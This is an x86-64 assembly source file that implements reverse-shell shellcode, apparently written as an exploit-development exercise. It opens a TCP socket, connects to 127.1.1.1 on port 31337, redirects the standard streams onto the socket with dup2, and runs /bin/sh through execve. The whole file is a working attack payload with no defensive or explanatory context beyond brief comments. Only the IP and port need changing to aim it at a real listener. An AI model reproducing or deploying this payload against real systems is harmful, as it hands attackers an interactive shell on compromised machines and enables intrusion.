global _start
section .text

_start:
	; socket
	xor rdi, rdi
	xor rsi, rsi
	mul rsi		; clear rax and rdx

	add rdi, 0x2

	add rsi, 0x1
	
	add rdx, 0x6

	add rax, 0x29
	syscall		; exec socket syscall

	mov rdi, rax	; return value
	
	; connect
	xor rsi, rsi
	push rsi
	
	mov byte [rsp], 0x2

	mov word [rsp + 0x2], 0x697a		; port 31337

	mov dword [rsp + 0x4], 0x0101017f	; ip 127.1.1.1

	mov rsi, rsp

	push 0x10
	pop rdx
	
	push 0x2a
	pop rax

	syscall 	; exec connect syscall
	
	; dup2
	xor rsi, rsi
	push 0x3
	pop rsi

doop:
	dec rsi

	push 0x21
	pop rax
	
	syscall		; exec dup2 syscall

	jne doop

	; execve
	xor rdx, rdx
	xor rsi, rsi
	push rsi

	mov rdi, 0x68732f6e69622f2f
	shr rdi, 0x8

	push rdi
	push rsp
	pop rdi
	
	push 0x3b
	pop rax

	syscall		; exec execve syscall
